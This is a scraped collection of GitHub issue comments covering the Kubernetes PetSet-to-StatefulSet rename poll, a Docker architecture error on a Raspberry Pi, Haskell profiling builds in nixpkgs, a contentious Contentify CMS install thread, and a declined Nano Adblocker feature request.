kubernetes/kubernetes/27430/255343875,"Anyone who's running a poll - can you please make sure to have  on it? I, for one, quite like the name, and would like to ensure people who share this opinion are not excluded from voting by a mindset of ""it must be changed"" ",,False,False,27430
kubernetes/kubernetes/27430/255367758,"Totally agree with @friend  So disappointed by @friend / team's decision by excluding  option - even when there are multiple people on this thread that would like to have a right to vote for this option.  Let people vote for it and let it ""die democratically"" if people don't vote for it. By excluding it you are making this entire process unfair, biased, non-open/transparent. There are so many arguments in favor of  and literally no valid argument against it (except some heavily stretched attached stories in the introductory post). Just distance yourself from 'pet vs cattle' metaphor and if anyone asks what is  just explain it is wonderful shortcut for ridiculously long  or Yea - sure - by excluding  from the list - not sure what kind of community you mean Anyway - thanks for the great product and have a nice day ",,False,False,27430
kubernetes/kubernetes/27430/255432965,"I haven't followed the whole discussion, but  looks IMHO like a better choice than any of the proposed ones in the poll (why do we even consider ?). I also agree that ""pet vs. cattle"" analogy might be misleading, but it's not a strong argument for me. I'm refraining from voting in the poll right now as the original  is not even on the list disappointed ",,False,False,27430
kubernetes/kubernetes/27430/255455909,"@friend @friend @friend can you help me understand more? As we've said, the issue is not solely the concerns at the top of the thread. PetSet is inherently a bad name because it is both ""cute"" and ""does not implicitly describe the functionality of the object."" Further, it requires understanding the ""Pets vs. Cattle"" analogy, which should not be required reading for running a distributed system like Kubernetes. If I'm missing something, please let me know! ",,False,False,27430
kubernetes/kubernetes/27430/255479184,"@friend my 2 cents  the name probably should end with ""Set"" to be consistent with ""ReplicaSet"" (reading the thread I now understand the ""*Array"" proposals, but they are not intuitive to me at first) it should be memorable it should be rather short its acronym should be compatible (no conflicts and not ""unfortunate"" like ""SS"") pets might be cute, but how can a little bit of cuteness be bad in this cruel world? smirk_cat  pets deserve our special care, so it somehow describes a property intuitively (no need to know the whole ""pets vs. cattle"" analogy) I like the proposal ""PetSet, redefined as an abbreviation/backronym of PersistentSet (""Pe't"")"" I don't like having a poll with a curated list which excludes the original name (that just sounds neither transparent nor fair to me) ""PersistentSet"" comes closest for me, but it's not consistent (""ReplicaSet"" == ""Set of Replicas"", ""PetSet"" == ""Set of Pets"", but ""Set of Persistent""?)  For me to understand how big is the pain with the current naming really (maybe just a poll to find out?)? I personally just don't see the pain outweighing the hassle of changing to another subpar solution. BTW I just came here because the poll was posted in Slack and I first thought ""oh cool, a naming poll smile"", but then I saw the available poll options disappointed ",,False,False,27430
kubernetes/kubernetes/27430/255490731,"@friend now my 2 cents  Regardless of the name  everyone in the community should be treated equally every voice should be listened to - not just selected part of the community process should be open, fair, transparent and objective (that's something that I guess everyone expects from the open community) Title of this issue is 'Please consider changing' - naturally it seems that one option to vote for should be 'No, do not change'   Regarding PetSet name arguments that are unquestionable  It's already here A lot of docs/articles/tutorials A lot of users/companies invested time/money  ""breaking people has cost, and we generally avoid breaking people at all because it is far more impactful than a name."" by @friend from RedHat     Arguments for PetSet name which are mostly subjective - hence it should be allowed for users to express their opinions and be able to vote for A lot of supporters of that name in here (including members of kubernetes team) - excluding all those users is unfair 'cute', 'too cute', 'bad because cute' is very subjective For me the name is perfect, short, memorable - I like to treat my computer and ""special"" servers as something I care about   There does not have to be ANY association with 'vs cattle' analogy There is no perfect name (otherwise there wouldn't be any discussion/poll) Proposed names are not better and don't really ""describe the functionality of the object"" Stateful? Nominal? Identity? Array? They might create even more confusion that one would hope for        There also might be people that are not in love with the name but think it's good enough (not worse than proposed ones) and price of change is too big to justify the change - so excluding ""Do not change anything"" in the poll is also unfair. If the name is as bad as you (personally) think it is - then the poll will verify it and it will get rejected - but at least process will be fair and objective Thanks for consideration ",,False,False,27430
kubernetes/kubernetes/27430/255540138,"I'm personally a fan of PetSet. When I first saw it in the documentation I knew exactly what it was for and what problem it solved before I even read a word about it and how often does that ever happen?  It also seems more succinct than any of the alternatives so far. It could be argued that the vast majority of people in the container community will understand the analogy and that anything that can be done to make kubernetes concepts easier to understand by building on existing concepts will reduce the overall bandwidth spent answering questions that could be spent making PetSet's even better ) I'm certainly not opposed to a name change, I just hope it will be for a better, more succinct name since names really are important. ) ",,False,False,27430
kubernetes/kubernetes/27430/255558785,"I know people probably don’t want even more choices at this point but, after reading again recent arguments and looking at the options in that poll, I wonder why I haven’t seen OrderSet - os OrderedSet - os OrderedInstanceSet - os IndexSet - is IndexedSet - is IndexedInstanceSet - is SequenceSet - seq SequencedSet - seq SequencedInstanceSet - seq OrdinalSet - os Key point Noun (not Adjective) It’s important that the name reflects what the abstraction actually represents and establishes expectations. Just stirring things up on an otherwise boring Saturday ) ",,False,False,27430
kubernetes/kubernetes/27430/255602824,@friend I noticed that the polljunkie summary scores do not seem to make sense when compared with the downloadable votes. I encourage you to use the Export to CSV option and crunch the numbers yourself to find the Condorcet winner. ,,False,False,27430
kubernetes/kubernetes/27430/255603469,Thanks for the info.  I'll download the csv as well after midnight on Monday night. ,,False,False,27430
kubernetes/kubernetes/27430/255730017,"The whole idea of renaming, because of pets should not be replaced (kill and create) is a bit crazy to me. As german I have to say that having shortcuts like ""ns"" [1] and ""sa"" [2] are much more offending than ""PetSet"". I totally agree with @friend @friend @friend . [1]  ",,False,False,27430
kubernetes/kubernetes/27430/255792718,"@friend it seems unfair to the conversation to compare two letter acronyms as similar to an intentional metaphor. The question is whether the ""pet"" term lends itself too naturally to the phrase ""vs cattle"" as discussed from the beginning or whether it stands on its own as @friend discussed. I still like pet since it makes me think of my pets, which I do value more than other animals. That's my preference, but I'm happy with how open the discuss has been and I'm thankful our community is rising to the occasion to find a democratic process. Thanks again to @friend for all the hard work! ",,False,False,27430
kubernetes/kubernetes/27430/255908574,"Minor observation  can just as easily use  as a shorthand rather than the suggestions above for  again, for those of us who like short names ",,False,False,27430
kubernetes/kubernetes/27430/256048909,The poll result is official? PetSets are StatefulSets now? ,,False,False,27430
kubernetes/kubernetes/27430/256087099,"I think that chosen  is very bad name, what if I have stateless ? ",,False,False,27430
kubernetes/kubernetes/27430/256092635,@friend do we have results?  I need to rename a talk at kubecon ,,False,False,27430
kubernetes/kubernetes/27430/256099586,"Yes, I am crunching the final tally to find the condorcet winner which may or may not be consistent with the polljunkie results (which uses a different method).  I'll update later today. ",,False,False,27430
kubernetes/kubernetes/27430/256107322,"I think what redis did here is worthy of thought  we talk about PetSets, we have an opportunity for advocacy.  Talking about things and giving them names is the only way to effect change.  I have never thought more about cattle and where meat comes from than I have since the pets vs cattle analogy came about.  We don't need to endorse the analogy, but stopping using the words removes that thought from my mind. @friend what is a successful outcome here? ",,False,False,27430
kubernetes/kubernetes/27430/256124604,"Yes Chris. That was my main concern when I first posted on this thread. But how big of a debt is it really? I mean, this is still beta, and it’s only been out for a few months. I’m not saying the cost is zero. There are clearly many documents, blog posts, tutorials, videos, etc. already out there. My point is that it’s only going to get worse. And if we’re going to make a change it should be done now. ",,False,False,27430
kubernetes/kubernetes/27430/256128192,"I know people probably don’t want even more choices at this point but, after reading again recent arguments and looking at the options in that poll, I wonder why I haven’t seen OrderSet - os OrderedSet - os OrderedInstanceSet - os IndexSet - is IndexedSet - is IndexedInstanceSet - is SequenceSet - seq SequencedSet - seq SequencedInstanceSet - seq OrdinalSet - os Key point Noun (not Adjective) It’s important that the name reflects what the abstraction actually represents and establishes expectations. Just stirring things on an otherwise boring Saturday ) ",,False,False,27430
kubernetes/kubernetes/27430/256128722,PersistentPodSet? ,,False,False,27430
kubernetes/kubernetes/27430/256190365,"My own analysis of the 77 votes cast so far shows that  is the runaway winner, by the Condorcet winner criterion. The pairwise comparisons ( vs. X) were plus one5 v. PersistentSet plus one9 v. IdentitySet +27 v. NominalSet +35 v. PersistentInstanceSet +37 v. IdentityArray +39 v. NominalArray +43 v. PersistentArray +43 v. PersistentInstanceArray +45 v. RoleArray +47 v. RoleSet +47 v. StatefulArray +53 v. StatefulApp +65 v. Stateful In any event, #35534 is already open to track renaming to . ",,False,False,27430
kubernetes/kubernetes/27430/256191731,"I finished crunching the numbers and the winner is StatefulSet. It won via multiple methods - average position (polljunkie) and condorcet using completion rules Schulze/Beatpath/CSSD, CIVS Ranked Pairs, MAM, Condorcet-IRV. There is sometimes a bit of variation on the ordering after the top but the top is always StatefulSet. The new name for PetSets will be StatefulSet. I am truly sorry that some folks were displeased with the processes, transparency, and choices.  Hopefully we can do a much better job next time should such a need arise. ",,False,False,27430
kubernetes/kubernetes/27430/256210785,"I'll take the todo to formalize some of the name decision processes and get that adapted to api_change.md.  We have a set of guidelines for names (some of which we helped describe here) and that will help make the future process for name changes smoother. Marking as resolved - thanks everyone for keeping this civil, even if there were some bumps. ",,False,False,27430
kubernetes/kubernetes/27430/256279151,"@friend would be great if you consider the old name in the next poll. I don't really care about names, but if you break backwards compatibility, because of renaming then I care. ",,False,False,27430
kubernetes/kubernetes/27430/256281997,@friend having a defined process about re-naming I think is worthwhile. Think it would have helped with some of the bumps.  Appreciate u taking that on ,,False,False,27430
kubernetes/kubernetes/27430/256390501,"I'll take the todo to formalize some of the name decision processes and get that adapted to api_change.md.  We have a set of guidelines for names (some of which we helped describe here) and that will help make the future process for name changes smoother. On Tue, Oct 25, 2016 at 608 PM, Dan Paik notifications@friend.com wrote ",,False,False,27430
kubernetes/kubernetes/27430/256394474,"@friend if you can have a PR / issue open for comment about doing so, that'd be swell (and link it in this issue) ",,False,False,27430
kubernetes/kubernetes/27430/256725020,Renaming to StatefulSet ,,False,False,27430
kubernetes/kubernetes/27430/256726964,"There is the question of how we decide the name.  I don't think voting turned out to be a good way to do that. There is also the question of how rename impacts users.  We will see how the ""delete alpha resource"" impacts users when they upgrade their clusters to 1.5 and StatefulSet.   We may decide that pattern is too costly.  If so, we should invest in the API machinery to allow us to concurrently host the old Kind and the new Kind (in cases when the representations are intraconvertible). @friend we talked about this topic recently. ",,False,False,27430
kubernetes/kubernetes/27430/256727188,"@friend your proposal will cover both those topics? (and more, I suspect, knowing you 😄 ) ",,False,False,27430
kubernetes/kubernetes/27430/256787178,"Yeah I plan to early next week. On Thu, Oct 27, 2016 at 218 PM, Eric Tune notifications@friend.com wrote ",,False,False,27430
moby/moby/35447/272477450," /kind bug /kind error /sig docker /sig openwrt What happened I can't run this command in Raspberry Pi3 Raspbian docker. docker import  openwrt-x86-generic-rootfs docker images REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE openwrt-x86-generic-rootfs   latest              9015fa51eb3f        48 seconds ago      5.28MB &lt;none&gt;                       &lt;none&gt;              e4205a844e2b        19 minutes ago      5.28MB docker run -i -t openwrt-x86-generic-rootfs /bin/ash standard_init_linux.go195 exec user process caused ""exec format error"" ♠ I just want to Open WRT environment by Raspberry Pi3 on Raspbian with Docker.. What should I do? Anything else we need to know? Environment  Docker version (use ) Client Version      17.10.0-ce API version  1.33 Go version   go1.8.3 Git commit   f4ffd25 Built        Tue Oct 17 191344 2017 OS/Arch      linux/arm  Server  Version      17.10.0-ce  API version  1.33 (minimum version 1.12)  Go version   go1.8.3  Git commit   f4ffd25  Built        Tue Oct 17 190618 2017  OS/Arch      linux/arm  Experimental false  Cloud provider or hardware configuration Raspberry Pi3 on Raspbian  OS (use ) Linux raspberrypi 4.9.59-v7+ #1047 SMP Sun Oct 29 121923 GMT 2017 armv7l GNU/Linux  Kernel (e.g. ) Linux master 4.10.0-37-generic #41~16.04.1-Ubuntu SMP Fri Oct 6 224259 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux  Install tools Docker-CE v17.10  Others  ※ P.S  Could you recommend the way that how to set up Open WRT environment using docker images? ",,False,False,35447
moby/moby/35447/343142950,(you can't run x86 binaries on ARM) ,,False,False,35447
moby/moby/35447/343143586,"Yes, looks like you're trying to run binaries for a different architecture, which won't work. Let me close this issue, because this is not a bug, but feel free to continue the conversation. ",,False,False,35447
moby/moby/35447/343338546,Could you recommend the Open WRT Image on my docker environment? ,,False,False,35447
moby/moby/35447/343339738,no idea; sounds like a better question for the Open WRT community; this showed up when Googling; ,,False,False,35447
nixpkgs/NixOS/22340/204548550,"Serious Haskell hackers need to profile their code, and that requires special variants of the libraries involved in the build. By default, we don't build those libraries. Should we? If we do, then I see the following options  Provide separate package sets (e.g.  and ) and selectively enable both variants on hydra.nixos.org for appropriate compiler versions, i.e. for the default compiler that's used to build , too. This means that users get the non-profiled package set by default, but they can switch to the profiled package set if they wish to do so. Pros  Users who wish to use profiling can do so. Users who don't profile see no difference, i.e. they don't have to download larger packages or deal with increased closure sizes, etc. Cons  We let  compile every library 5 times (static, dynamic in non-profiling package set, static, dynamic without profiling plus static with profiling in the profiling package set). This is going to slow down our builds, no doubt, and it's also doing to slow down other, non-Haskell builds. The amount of data our binary cache has to store increases by a factor of 2.5, approximately, because we upload the profiled packages in addition to the non-profiled ones. Hard-linking the identical files in both variants won't work because  doesn't produce deterministic binaries across re-builds of the same code.     We can enable profiling by default in our main package set, . Pros  Users who want to profile their code can do so without any manual effort at all -- everything just works. Cons  Hydra has to compile an additional variant of every library, which will increase the build time by a factor of 1.5, approximately.  The disk space and bandwidth requirements on  increase by a factor of ~1.5, too. We increase the build-time and runtime closure size of every dynamically linked Haskell derivation (that is almost all of them) by a factor of ~1.5 for all users, not just for those who care about profiling. That issue could be mitigated by placing profiling libraries into their own derivation output, but it's not clear whether this can be accomplished easily and the corresponding ticket,  has made no progress in the last 2.25 years, so it's not obvious why a working implementation of that feature should pop up out of the blue right now.      Opinions? ",,False,False,22340
nixpkgs/NixOS/22340/276634155,"This isn't really a community discussion, is it? Whoever is paying for Hydra can decide this unilaterally. Technically, it would probably be possible to modify GHC such that it would output both profiling and non-profiling in once pass, if anyone wanted to do any engineering on it, that is. ",,False,False,22340
nixpkgs/NixOS/22340/276653396,I'm in two minds about this At LumiGuide we use option 1. We care about small closure sizes since some of our machines are connected to the internet through mobile links with limited bandwidth. Although option 2 would be simpler and thus more user friendly which IMHO weighs more heavily than our specific requirements. So for me it's a +0.1 for option 2 and I hope  will make progress. ,,False,False,22340
nixpkgs/NixOS/22340/276751475,"I believe that this is more a question of what the user wants, or rather what we want the user experience to be like. Whether Hydra will cope with the load or not is a subject of speculation. Nobody really knows and we're probably not going to get a definite answer to that question. IMHO, we should chose whatever the best solution is and then try it. ",,False,False,22340
nixpkgs/NixOS/22340/277270900,"At Takt we use a mixture of options 1 and 2. For all non-Takt code we use option 2, but then for our own code we use option 1 (in fact we go even further We have a package set enabling optimizations for our packages, and another package set disabling them). This has worked quite well for us, because we only have to compile our dependencies once and they will satisfy the needs of any option 1  alternative we might want to use for our own code. With this in mind, I lean towards option 2, as I think it leads to a more rewarding stock experience for users. Those needing smaller closure sizes can tune these things a bit. By the way, besides setting  and  to , we are adding this to our  ",,False,False,22340
nixpkgs/NixOS/22340/277757117,"If we go with 2 plus multiple outputs, we can still get small closures ",,False,False,22340
nixpkgs/NixOS/22340/277758244,"Your own packages , or over the entire package set? If it's the latter, I really wouldn't want that in ! Almost everything on Hackage should have no profiling information added unless a flag is turned on. The fact that some packages unilaterally export  is a bug of those packages - it just poisons profiling information. But if it's just your own stuff, then of course that makes sense (though I'd still suggest using  in your cabal files, and protecting it with a flag). ",,False,False,22340
nixpkgs/NixOS/22340/277759588,"@friend I agree with your thoughts. This works well for our use case (although fortunately we don't need to do profiling very often!), but for  we probably don't want these as default. ",,False,False,22340
nixpkgs/NixOS/22340/277764314,"seems to be useful for stack-traces, though, which maybe is something worth having by default ",,False,False,22340
nixpkgs/NixOS/22340/277768746,"Still a ""please no"" to that. That's a ton of information in  output, most of which will be outside my control anyway. ",,False,False,22340
nixpkgs/NixOS/22340/277771376,"Hmm... maybe this highlights a problem, then Seeing as ""enabling profile information"" can mean different things depending on the flags passed to the compiler, does it make sense to provide a profiled Haskell package set at all if it won't satisfy the profiling needs of most people? ",,False,False,22340
nixpkgs/NixOS/22340/277779126,"The only reason I want a profiling set is so I can compile my code with profiling. Ultimately, any called library code will show up in my own profiling by making my own calls themselves slow. I profile with the attitude of ""vendor code is efficient, my code is inefficient"". Only after ruling out my own code as being problematic do I want to start seeing the gory internals of other code. And even then I gradually opt in and work my way ""down the stack"", so to speak. On Mon, 6 Feb 2017, 634 pm Renzo Carbonara, notifications@friend.com wrote ",,False,False,22340
nixpkgs/NixOS/22340/278677010,@friend I can agree with that reasoning 👍 ,,False,False,22340
nixpkgs/NixOS/22340/283048389,"It's hard to decide which one solution is best. After some thought, I lean towards enabling profiling library builds by default in the upcoming  release branch (but not in ). The rationale for that choice is that I assume ""end-user types"", who benefit the most from this change, to be most likely using the release branch rather than following git . People who follow git , on the other hand, I assume to be able to accomplish whatever they need by means of overriding the default configuration. Having profiling enabled by default gives more convenience to normal users, but it's a disadvantage for power users who want to create their own. minimal installations for production. Again, here I assume that those people know how to override the configuration in order to do exactly what they need. I'm sure this is not the best solution, but I can't think of any better one. ",,False,False,22340
nixpkgs/NixOS/22340/283088643,"Eh, I'm -1 on release branches behaving differently that way. The ""normal user"" ""git master user"" distinction is not one we want to make bigger! ",,False,False,22340
nixpkgs/NixOS/22340/289416619,"OK, I suppose I won't enable profiling builds on  at all since there is no obvious solution how to do it in a way that's sufficiently beneficial for our users to warrant the costs such a change would incur. I'll leave the ticket open for now, nut I'll remove the  label. ",,False,False,22340
nixpkgs/NixOS/22340/291853486,"I think option 2 is really the way to go for now. The main drawback is really going to be the increased closure size. @friend highlights a concern here due to the link to deployment machines being a bottleneck, but I wonder - do you compile into a static binary? At CircuitHub we have found the smallest closure is to build a statically linked executable and then strip it. In this case, I'm not sure the inflation of profiling libraries would make a difference, and they would become a development-only cost. ",,False,False,22340
nixpkgs/NixOS/22340/291857386,@friend at LumiGuide I recently wrapped all our Haskell executables in  and I was very happy with the results. For our image analysis server  closure size went from 2490.53 MiB to 1668.72 MiB. output size went from 26.70 MiB to 22.87 MiB.  So I don't have a problem anymore with option 2. ,,False,False,22340
nixpkgs/NixOS/22340/359306218,"If the profiling versions of libs can't be supplied by , I think I've reached a reasonable approach for achieving it manually. ",,False,False,22340
nixpkgs/NixOS/22340/359308424,@friend does the recent multiple outputs stuff change things here? ,,False,False,22340
nixpkgs/NixOS/22340/373906344,This will make a huge difference. Thanks for sorting this Peti! ,,False,False,22340
nixpkgs/NixOS/22340/373924554,It's very good that we now have profiled libraries available from the cache. No need to build our own profiled libraries anymore. Thanks peti! ,,False,False,22340
nixpkgs/NixOS/22340/373927708,Oh interesting. ,,False,False,22340
Doomsday-Trail/AnthonyMarc23/1/335396060,@friend check it out ,,False,False,1
FastHub/k0shk0sh/2181/394037322,"Proposes several changes to increase ease of reading strings. The general message conveyed has not been changed, but there have been some adjustments  Typos fixed Punctuation added where currently missing Consistency in terms of American/British language (specifically the word ""organizations"") A couple of changes to words which sound better  (cc @friend) ",,False,False,2181
GameController/RoboCup-Humanoid-TC/17/223780657,Adding the Rhoban Football Club logo (HL KID team 16) ,,False,False,17
GameController/RoboCup-Humanoid-TC/17/297620954,Looks good to me ) ,,False,False,17
FrameworkBenchmarks/TechEmpower/1024/40441145,"I removed the dirs in #883, but the dirs were accidentally re-added in when merging PR #1015. ",,False,False,1024
FrameworkBenchmarks/TechEmpower/1024/52435722,"Ah, my bad. Thanks for cleaning it up ",,False,False,1024
Flexbones/roikles/61/186262270,Came across a situation where it was necessary to add a column to the wordpress post list in the backend to show taxonomies per post and it couldn't be simpler to implement just add the following to the Taxonomy arguments in lib/taxonomies.php ,,False,False,61
Flexbones/roikles/61/265723164,Fixed in 846dcdc ,,False,False,61
Contentify/Contentify/398/338891837,"So I installed this for a friend, and already at the installation I noticed that much stuff doesn't work. The current release version has errors with the apache_get_modules function, which is disabled due to security reasons, the script wants access to the php main directory, which a php script NEVER should have access to. And after I gave him all this, I just get that  What the hell. ",,False,False,398
Contentify/Contentify/398/402999274,Ok I found the mistake. Ever heard of case sensitive? Apperently not ,,False,False,398
Contentify/Contentify/398/403026140,"Hello Contentify is an open source software without any funding or commercial background (currently at least). Creating and maintaining an entire CMS usually keeps whole companies busy over years, costing up to millions of dollars / euros. Lacking these means you have to try to find smart cutoffs. This is why Contentify has zero tests (automatic tests via PHPUnit etc.) and this is why there is no huge testing phase before a new version of Contentify is released. Sometimes this causes error. You faced one of these, because Contentify is developed on Windows, not on Linux. Windows is case insensitive regarding file names. ",,False,False,398
Contentify/Contentify/398/403027119,Closing this one. Please stick to constructional criticism if you want to get help. ,,False,False,398
Contentify/Contentify/398/403028973,"The fact that you say ""Developt on Windows"" shows me that you have no idea. Case Sensivity is something that everyone should follow, and I am sorry that you don't see that. Here your critic First apache_get_modules is a security issue and by default on most webservers disabled Second Your installer ignores the entry at the MySQL data and tries as root anyways, you have to reload the page and try again for it to work, I would guess thats because you first try to connect before reading and saving the mysql data. Third Case sensivity is something that exists since years, and it became a standard under developers to always keep case sensivity in mind. and last but not least If it was developt on windows and does not work on Linux by nature, you should write that in the requirements. ",,False,False,398
Contentify/Contentify/398/403030035,And also thank you for being in the EU and not following the laws. Read it up kiddo DSGVO ,,False,False,398
Contentify/Contentify/398/403033160,Oh also btw WoltLab and WordPress are also Open Source and they have way more features. ,,False,False,398
Contentify/Contentify/398/403033631,"Another afront, and again you do not care about the reasons. Ofcourse every developer who creates software that typically runs on a Linux OS has to know about the important differences between the target OS and the development OS. Thus however does not guarantee no typos etc are made. Take a look at your own quote, you quoted me wrong (""Developt""). Nothing else happened @ Contentify. A stupid mistake, yes. But if you do not take the circumstances into account you should be very careful with attacking others. And again, you blame others for not creating a perfect software for free. ",,False,False,398
Contentify/Contentify/398/403034224,"No I blame you that since more then 24 hours I have nothing but problems with this. And that just because you didn't wrote a capital C , but instead a lowercase one ",,False,False,398
Contentify/Contentify/398/403034409,"But whatever, I will fork it, exchange it and do a pull request. Is that enough Constructive critic for you? ",,False,False,398
Contentify/Contentify/398/403037205,"Good. Whetever. I don't care. I am not a user of this, a friend asked me to setup it for him and I said yes and since 24 hours I just have problems. I fixed it now, you know about the Case Sensivity error, I don't care about anything else. ",,False,False,398
Contentify/Contentify/398/403079902,"Thank you, for reporting the issues and giving explanations why they are issues. Believe it or not, I understand why you are upset. I work as a professional software developer and I’d be very upset if a software that I have bought does not work. But that is the point, this is not the case here. The only “payment” is... if some say “thank you”, I guess. Getting negative feedback is okay but it is frustrating as well if it feels like an attack against the persons that spend their free time on creating something without making any money with it. ",,False,False,398
Contentify/Contentify/398/403125138,"Sorry for being a bit harsh. It was just that the tone of your second and third post was quite unfriendly. Honestly, Contentify cannot reach the same high quality level as for example WordPress. WP has a huge community and lots of contributors plus a strong commercial background. None of these is true for Contentify. Therefore, it has no ads ad all, nowhere at all (except of some recommendations which do not generate any money). It does not spy on you or restrict you. DSVGO / GDPR...  If this really is something that interests you, let me ensure you, the only thing you have to worry about is the use of Google Analytics on the contentify.org website. That's the only ""evil"" third party software that is in use. And on our side, we do collect very (extremely?) few client data and we do very (rarely / almost none) analysis of the collected data. And ofcourse we do not sell / share any user data (not including Google Analytics). ",,False,False,398
Contentify/Contentify/398/409973397,@friend Do not listen to him this CMS is great and thanks for creating! ,,False,False,398
Contentify/Contentify/398/482079135,Update Contentify.org is officially GDPR compliant. ,,False,False,398
NanoCore/NanoAdblocker/87/287260640,i think this is the best enhancement ,,False,False,87
NanoCore/NanoAdblocker/87/356443671,I don't see a reasonable implementation of this... ,,False,False,87
NanoCore/NanoAdblocker/87/356444124,"Filter lists can limit the amount of domains each rule apply to with many ways. If you need to set a different set of filter lists for each domain, then chances are the filter lists you are using are kind of broken.  And there isn't a reasonable way to swap filter lists sets internally. ",,False,False,87
NanoCore/NanoAdblocker/87/356447669,"it depends on how the internal data structure of the core looks like if the rules still have a reference to the list they came from then it shouldnt be too hard to just ignore them on a specific website just like you can switch off blocking completely for a site. if the internal structure is just a huge merged and optimized set of rules, which i assume is the case, then you would have to rebuild that internal structure once you click on that button or when you later load that site again or if you leave and all filterlists should be on again. if the performance hit is too great then there are two ways to deal with it. generate an internal structure for each new combination of active lists and keep it for later or use the normal datastructure when all lists are on and if one or more are disabled then execute each least sequentially. this could behave differently than a combined list, like you mentioned, so maybe some sort of hybrid would be needed. so, yeah, not an easy task if my assumptions about the project are correct. but it would still be a very worthwhile feature that you shouldn't give up that easily. maybe gorhills rework of the engine makes this easier to implement. ",,False,False,87
NanoCore/NanoAdblocker/87/356449799,"Whitelist just completely disables filtering, that's different than disable one specific filter list for that domain. Currently, if I understood the code right, each filter list will be compiled separately and stored, all selected filters are merged together. The merging process need to be done every time a filter list is turned on or off. There are also snapshots of internal states for fast startup. I can't think of a single use case. Did you spelled ""harder"" wrong? ",,False,False,87
NanoCore/NanoAdblocker/87/356460317,"i dont think he wanted whitelisting. if you have experimental or generic filterlists that work well most of the time but occasionally break sites then you want to quickly disable the list for this specific website but not in general and you do not want to go through the dashboard every single time you visit that site again. you should also contact the maintainer but it will take time until it is fixed. you could even just move along and after a few weeks you look up your dynamic rules and post a bug report with all the problems you collected over time but were too lazy to report at that moment. well, unlikely but at least possible ",,False,False,87
NanoCore/NanoAdblocker/87/356461593,"Just override the rule with your custom filters, that's what it's for. ",,False,False,87
NanoCore/NanoAdblocker/87/356463212,"while still a lot more work than 2 clicks i could do this. most people wont. blocking something with the element hider is something many would be capable but figuring out an exception rule is too much for casual users who just set it up, tweak a few options and select and install a few lists and then call it a day. not everyone is going to read the wiki about the filter syntax and then debug every page that causes problems. giving them a better option than having to switch off Nano Blocker entirely or uninstalling a list just because of one or two false positives would really add some usability benefit. ",,False,False,87
NanoCore/NanoAdblocker/87/356465040,"If you are a casual user, chances are you won't be adding filter lists other than those that come with Nano Adblocker.  If you are a casual user, chances are you won't be able to know which filter list you have is causing the problem.  If you can find out which filter list is causing the problem you will be able to set up the exception filter. If you absolutely need to toggle between two sets of filters, use browser profile. This is non-trivial and only has theoretical use case, I'll decline this feature for now. ",,False,False,87
NanoCore/NanoAdblocker/87/356465261,What I will do is to add a button in Logger that turns off a rule. ,,False,False,87
NanoCore/NanoAdblocker/87/356469661,mayby quick access to off specific rule on single site example.  ,,False,False,87
NanoCore/NanoAdblocker/87/356473436,"If you find yourself have to toggle a filter list frequently, then you probably need to figure out what exactly is wrong. ",,False,False,87
NanoCore/NanoAdblocker/87/356477516,you do not only want this when something is wrong. maybe you have a list that implements a night mode and you personally do not want it on a specific site or a floating header that you want for some special use case or you want to allow ads for a site but not tracking and annoyances.... besides that it is great for trouble shooting. you turn off lists as long as the site works again. then you immediately know who to send a bug report to. ,,False,False,87
NanoCore/NanoAdblocker/87/356479301,"If you need a night mode or any other mode, use browser profile.  For trouble shooting, use the Logger. ",,False,False,87
NanoCore/NanoAdblocker/87/356515829,make a browser profile for every website? thats not practical. you do not need that many tries if you always the disable half of the remaining ones. ~log2(n) turns. ,,False,False,87
NanoCore/NanoAdblocker/87/356574112,an ordinary user will not be able to and will not want to look into the logger. ,,False,False,87
NanoCore/NanoAdblocker/87/356580154,like this?  ,,False,False,87
NanoCore/NanoAdblocker/87/356602225,You do realize there are over 100 000 rules enabled by default right? ,,False,False,87
NanoCore/NanoAdblocker/87/356602438,on single site?  O ,,False,False,87
NanoCore/NanoAdblocker/87/356603054,There are well over 10 000 rules affecting every single site. A lot of generic rules in EasyList. ,,False,False,87
NanoCore/NanoAdblocker/87/356603912,hmm.. you can segregate this rules to category and hide ,,False,False,87
NanoCore/NanoAdblocker/87/356608801,"gorhill has his decisions, I have mine. If you disagree with both, then you have to look for another fork, or fork yourself, then you don't need to convince me to implement the feature. Maybe we have a different definition of ""casual user"", but I don't think any of the proposed feature is useful. If you need a per-site profile, then chances are you are not a casual user, and should use a custom filter list for that.  Listing active rules on the popup will definitely not be easier to use than the Logger, and casual users cannot understand what they are seeing. If Logger is too complex for them, putting a smaller Logger in the popup will just be worse. I'm not sure what that means, you are welcomed to teach me how to code, but do so in Pull Requests.  I'm locking this as it's not getting anywhere, if you truly believe this feature is necessary, please Pull Request, I can test out the result and maybe I will change my mind. ",,False,False,87
